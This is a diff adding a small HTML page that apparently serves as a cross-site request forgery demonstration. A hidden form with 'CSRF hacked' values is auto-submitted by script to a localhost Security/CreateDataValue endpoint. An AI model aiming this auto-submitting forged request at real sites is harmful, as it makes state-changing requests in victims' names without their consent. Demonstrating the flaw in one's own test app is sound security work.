@@ -1,0 +1,8 @@
+﻿<form action="https://localhost:44337/Security/CreateDataValue" method="POST" id="form">
+    <input name="Name" value="CSRF hacked name!!!" hidden="">
+    <input name="Value" value="CSRF hacked value!!!" hidden="">
+</form>
+
+<script type="text/javascript">
+    document.getElementById("form").submit();
+</script>
